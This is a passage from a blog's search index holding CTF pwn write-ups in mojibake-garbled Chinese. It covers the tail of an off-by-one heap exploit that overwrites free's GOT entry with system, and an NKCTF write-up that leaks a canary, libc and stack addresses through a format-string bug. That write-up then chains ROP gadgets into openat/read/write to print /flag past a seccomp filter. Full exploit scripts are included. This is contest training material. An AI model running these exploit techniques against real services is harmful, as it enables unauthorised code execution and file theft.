choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">add(<span class="number">0x30</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;free_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102221509.png" alt="image-20240710222113464"></p>
]]></content>
      <categories>
        <category>BUUåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>off-by-one</tag>
      </tags>
  </entry>
  <entry>
    <title>NKCTF_MaimaiæŸ¥åˆ†å™¨</title>
    <url>/2024/03/23/%E8%B5%9B%E9%A2%98wp/NKCTF-Maimai%E6%9F%A5%E5%88%86%E5%99%A8/</url>
    <content><![CDATA[<h2 id="å­¦ä¹ ä¸æ”¶è·"><a href="#å­¦ä¹ ä¸æ”¶è·" class="headerlink" title="å­¦ä¹ ä¸æ”¶è·"></a>å­¦ä¹ ä¸æ”¶è·</h2><ol>
<li><p>å½“æ ˆæº¢å‡ºçš„å­—èŠ‚æ•°ä¸èƒ½æ»¡è¶³æˆ‘ä»¬æ„é€ å®Œæ•´çš„<code>rop</code>é“¾æ—¶ï¼Œé™¤äº†æ ˆè¿ç§»æˆ‘ä»¬è¿˜å¯ä»¥å…ˆæ„é€ ä¸€ä¸ª<code>read</code>çš„<code>rop</code>é“¾ï¼Œè®©ç¨‹åºå†<code>read</code>ä¸€æ¬¡ï¼Œç„¶åå†å†™å…¥<code>rop</code>é“¾è¦†ç›–æˆ‘ä»¬è°ƒç”¨<code>read</code>æ—¶è‡ªå·±å†™çš„è¿”å›åœ°å€ï¼Œä»¥æ§åˆ¶æ‰§è¡Œæµæ‰§è¡Œ<code>rop</code>é“¾ã€‚</p>
<span id="more"></span>
</li>
<li><p>æœ‰çš„ç¨‹åºå¼€äº†æ²™ç®±ä¼šè¿‡æ»¤ä¸€äº›å‡½æ•°ï¼Œé™¤äº†<code>system</code>å…¶ä»–å‡½æ•°å¦‚<code>open</code>ä¹Ÿå¯èƒ½è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤<code>seccomp-tools dump ./pwn</code>æŸ¥çœ‹ã€‚</p>
</li>
<li><p><code>openat</code>å‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªç±»ä¼¼äº<code>open</code>çš„æ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼Œ<code>openat</code>å‡½æ•°æœ‰<code>4</code>ä¸ªå‚æ•°ã€‚<code>openat</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¦‚æœæ˜¯<code>0</code>ï¼Œå…¶ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»ä¸ºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼›ç¬¬äºŒä¸ªå‚æ•°å¦‚æœæ˜¯æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ï¼Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°éœ€ä¸ºç›¸å¯¹è·¯å¾„å‰çš„è·¯å¾„ã€‚</p>
</li>
<li><p>çŸ¥é“äº†<code>libc</code>åŸºåœ°å€ï¼Œæˆ‘ä»¬éœ€è¦ä»»ä½•æ²¡è§è¿‡çš„å‡½æ•°éƒ½å¯ä»¥åˆ°<code>libc</code>ä¸­å¯»æ‰¾ï¼Œå¦‚æœåˆ©ç”¨<code>ROPgadget --binary pwn | grep &quot;gadget&quot;</code>æ²¡æ‰¾åˆ°<code>gadget</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å»<code>libc</code>ä¸­å¯»æ‰¾ã€‚åˆ©ç”¨<code>ROPgadget --binary libc.so.6 | grep &quot;gadget&quot;</code>å‘½ä»¤ï¼Œæˆ‘ä»¬æ‰¾çš„æ˜¯åç§»<code>gadget_offset</code>ï¼Œ<code>gadget</code>çš„åœ°å€<code>gadget_addr = gadget_offset+libc_base</code>ã€‚</p>
</li>
<li><p>åœ¨æ³„æ¼<code>libc</code>åŸºåœ°å€çš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½æ˜¯éšä¾¿<code>printf</code>å‡ºä¸€ä¸ª<code>libc</code>ä¸­çš„ä»»æ„åœ°å€ï¼Œç„¶ååœ¨<code>ida</code>ä¸­è®¡ç®—åç§»ã€‚ä½†æ˜¯å¦‚æœæœ¬åœ°çš„åç§»ä¸è¿œç¨‹ä¸åŒï¼Œä¸”æˆ‘ä»¬ä¸å®¹æ˜“æŠŠæœ¬åœ°æ¢æˆè¿œç¨‹çš„<code>libc</code>ï¼Œæˆ‘ä»¬å¯ä»¥<code>printf</code>å‡ºå‡†ç¡®å‡½æ•°å‡½æ•°çš„<code>libc</code>åœ°å€ï¼Œç„¶åç”¨<code>elf.sym[&#39;read&#39;]</code>è¿™ç§è¡¨ç¤ºå‡ºåç§»ã€‚</p>
</li>
</ol>
<h2 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102243265.png" alt="image-20240323232259681"></p>
<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244858.png" alt="image-20240323232554875"></p>
<h3 id="æ³„æ¼åœ°å€"><a href="#æ³„æ¼åœ°å€" class="headerlink" title="æ³„æ¼åœ°å€"></a>æ³„æ¼åœ°å€</h3><p>â€‹	æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åªèƒ½è¾“å…¥<code>8</code>å­—èŠ‚ï¼Œå’Œä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ã€‚ä¿æŠ¤å…¨å¼€ï¼Œæˆ‘ä»¬å…ˆæ³„æ¼ä¸€ä¸ª<code>canary</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>æ³„æ¼<code>libc</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%3$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;read&#x27;</span>]-<span class="number">18</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>æ³„æ¼ä¸€ä¸ªæ ˆåœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>â€‹	æœ¬é¢˜æ‹¿åˆ°<code>shell</code>åæ²¡æœ‰æƒé™å»<code>cat flag</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨<code>open-read-write</code>æŠŠ<code>flag</code>è¯»å‡ºå¹¶æ‰“å°å‡ºæ¥ï¼Œåˆå› ä¸ºè¿‡æ»¤äº†<code>open</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨ä¸€ä¸ªä¸<code>open</code>å‡½æ•°ç±»ä¼¼çš„<code>openat</code>å‡½æ•°æ‰“å¼€æ–‡ä»¶ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244179.png" alt="image-20240324190744811" style="zoom:80%;" />

<h3 id="å¸ƒç½®ropé“¾"><a href="#å¸ƒç½®ropé“¾" class="headerlink" title="å¸ƒç½®ropé“¾"></a>å¸ƒç½®<code>rop</code>é“¾</h3><p>â€‹	å› ä¸ºæ˜¯<code>64</code>ä½ç¨‹åºï¼Œæ‰€ä»¥ä¼ å‚éœ€è¦å¯„å­˜å™¨ï¼Œæˆ‘ä»¬åœ¨ç¨‹åºé‡Œæ‰¾ä¸åˆ°<code>gadget</code>ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ°<code>libc</code>ä¸­æ‰¾<code>gadget</code>çš„åç§»ï¼Œå†åŠ ä¸Š<code>libc</code>åŸºåœ°å€å³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">rdx_r12 = <span class="number">0x000000000011f2e7</span>+libc_base<span class="comment">#0x000000000011f497+libc_base</span></span><br><span class="line">rcx = <span class="number">0x3d1ee</span>+libc_base<span class="comment">#0x000000000008c6bb+libc_base</span></span><br></pre></td></tr></table></figure>

<p>â€‹	ç¨‹åºä¸­æˆ‘ä»¬èƒ½æº¢å‡º<code>80</code>ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯<code>orw_rop</code>é“¾çš„é•¿åº¦è¿œè¿œè¶…è¿‡äº†<code>0x80</code>ä¸ªå­—èŠ‚ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆ<code>read</code>ä¸€æ¬¡ï¼Œ<code>read</code>åˆ°å“ªå„¿å‘¢ï¼Ÿ<code>read</code>åˆ°è£…è¿”å›åœ°å€çš„è¿™ä¸ªåœ°å€é‡Œï¼Œè¦†ç›–æˆ‘ä»¬çš„è¿”å›åœ°å€ï¼Œè¿™æ ·æ‰èƒ½ç»§ç»­æ§åˆ¶æ‰§è¡Œæµæ‰§è¡Œæ¥ä¸‹æ¥çš„<code>orw_rop</code>é“¾ã€‚è¿™ä¸ªè¿”å›åœ°å€ï¼Œæ˜¯æˆ‘ä»¬åœ¨<code>r_rop</code>é“¾ä¸­è‡ªå·±å¸ƒç½®çš„ï¼Œè°ƒç”¨å®Œ<code>read</code>å‡½æ•°åçš„è¿”å›åœ°å€ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>) <span class="comment">#è¿™ä¸ªstack+0x38-8æ˜¯æˆ‘ä»¬åæ¥å¡«ä¸Šçš„</span></span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>) <span class="comment">#è¿”å›åœ°å€éšä¾¿å¡«ï¼Œä¼šè¢«orw_ropé“¾è¦†ç›–</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#æ³¨æ„è¿™é‡Œä¸èƒ½ç”¨sendlineï¼Œå› ä¸ºæˆ‘ä»¬å¸ƒç½®çš„r_ropé“¾å·²ç»åˆšå¥½æŠŠ0x80ä¸ªå­—èŠ‚å å®Œï¼Œå†å‘é€ä¸€ä¸ªå›è½¦(\n)ä¾¿ä¼šè¢«æš‚æ—¶æ”¾åœ¨ç¼“å†²åŒºï¼Œç„¶åè¢«æˆ‘ä»¬å†æ¬¡è°ƒç”¨çš„readè¯»å…¥ï¼Œè€Œåé¢å‘é€çš„orw_ropé“¾ä¹Ÿå°±ä¸ä¼šè¢«è¯»å…¥</span></span><br></pre></td></tr></table></figure>

<p>â€‹	ç„¶åå¸ƒç½®<code>orw_rop</code>é“¾ï¼Œç”±äºæ–‡ä»¶æè¿°ç¬¦<code>0,1,2</code>å·²è¢«å ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬<code>openat</code>æ‰“å¼€çš„æ–°æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ä¸º<code>3</code>ï¼Œæ‰€ä»¥<code>read</code>è¯»å–<code>flag</code>çš„ç¬¬ä¸€ä¸ªå¯„å­˜å™¨çš„å€¼åº”è¯¥æ˜¯<code>3</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)+p64(rdx_r12)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rcx)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;openat&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå¯„å­˜å™¨ä¸ºè¦è¯»å–æ•°æ®çš„æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå³3</span></span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]+libc_base)+p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node.nkctf.yuzhian.com.cn&quot;</span>,<span class="number">33656</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/wen/Desktop/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">al = p.recvuntil(<span class="string">b&#x27;Select a option:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    payload = <span class="built_in">str</span>(<span class="number">15.0</span>).encode()+<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    payload = <span class="built_in">str</span>(<span class="number">15.0</span>).encode()+<span class="string">b&#x27;SSS+&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%3$p&#x27;</span></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1a36</span>,<span class="number">0x19ce</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;read&#x27;</span>]-<span class="number">18</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;%7$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&quot;canary&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">payload = <span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input your nickname.\n&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+libc_base</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+libc_base</span><br><span class="line">rdx_r12 = <span class="number">0x000000000011f2e7</span>+libc_base<span class="comment">#0x000000000011f497+libc_base</span></span><br><span class="line">rcx = <span class="number">0x3d1ee</span>+libc_base<span class="comment">#0x000000000008c6bb+libc_base</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">8</span>)</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">0x100000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(rsi)+p64(stack+<span class="number">0x38</span>-<span class="number">8</span>)+p64(rdx_r12)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rcx)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(libc.sym[<span class="string">&#x27;openat&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(stack-<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(rdx_r12)+p64(<span class="number">50</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]+libc_base)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102244004.png" alt="image-20240324192822020"></p>
]]></content>
      <categories>
        <category>èµ›é¢˜wp</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ²™ç®±</tag>
      </tags>
  </entry>
</search>
